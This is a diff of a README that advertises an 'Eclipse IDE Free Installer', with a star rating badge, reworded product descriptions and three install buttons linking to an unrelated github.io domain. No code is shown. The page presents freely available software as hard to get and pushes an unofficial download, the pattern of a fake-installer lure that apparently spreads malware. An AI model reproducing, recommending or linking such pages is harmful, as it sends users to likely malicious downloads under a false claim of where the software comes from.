@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-IDE-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Java+IDE-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Eclipse IDE Free Installer** — Eclipse IDE is a free, open-source development environment primarily for Java with a vast plugin ecosystem supporting dozens of languages and technologies. Works without internet access, no account required. Full offline installation.
+**💻 Eclipse IDE Free Installer** — Eclipse IDE is a free, open-source integrated development environment primarily for Java, with strong plugin support for C/C++, PHP, Python, and other languages. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Eclipse IDE](https://img.shields.io/badge/⬇_Install_Eclipse%20IDE-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Eclipse IDE](https://img.shields.io/badge/⬇_Install_Eclipse+IDE-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Eclipse IDE
 
-Eclipse IDE is a free, open-source development environment primarily for Java with a vast plugin ecosystem supporting dozens of languages and technologies. Widely used in enterprise Java development and as the foundation for many specialized development tools.
+Eclipse IDE is a free, open-source integrated development environment primarily for Java, with strong plugin support for C/C++, PHP, Python, and other languages. The Eclipse ecosystem includes hundreds of plugins through Eclipse Marketplace, supporting everything from modeling to cloud deployment. Long used in enterprise Java development, Eclipse remains relevant for large Java projects with extensive plugin requirements.
 
 ---
 
 ## ❌ Problem: Eclipse IDE is hard to access
 
-- **Resource Intensive** — High memory usage; workspace indexing on large projects is slow
-- **Complex Plugin Management** — Installing and managing plugins via Eclipse Marketplace can be unreliable
-- **Dated Interface** — SWT-based UI feels older than IntelliJ or VS Code
-- **IntelliJ Competition** — IntelliJ IDEA Community Edition provides better Java experience for free
+- **Performance** — Can feel sluggish compared to IntelliJ IDEA on large projects
+- **Plugin Management** — Plugin compatibility issues can cause stability problems
+- **Memory Usage** — High memory consumption with a full plugin stack
+- **Steep Curve** — Eclipse workspace concepts confuse new users
 
 ---
 
@@ -81,7 +81,7 @@ Eclipse IDE is a free, open-source development environment primarily for Java wi
 
 <div align="center">
 
-[![⬇ Install Eclipse IDE](https://img.shields.io/badge/⬇_Install_Eclipse%20IDE-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Eclipse IDE](https://img.shields.io/badge/⬇_Install_Eclipse+IDE-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Eclipse IDE is a free, open-source development environment primarily for Java wi
 
 ---
 
-**Eclipse IDE Free Installer** — Eclipse IDE is a free, open-source development environment primarily for Java with a vast plugin ecosystem supporting dozens of languages and technologies. Install without internet connection today!
+**Eclipse IDE Free Installer** — Eclipse IDE is a free, open-source integrated development environment primarily for Java, with strong plugin support for C/C++, PHP, Python, and other languages. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Eclipse IDE](https://img.shields.io/badge/⬇_Install_Eclipse%20IDE-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Eclipse IDE](https://img.shields.io/badge/⬇_Install_Eclipse+IDE-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
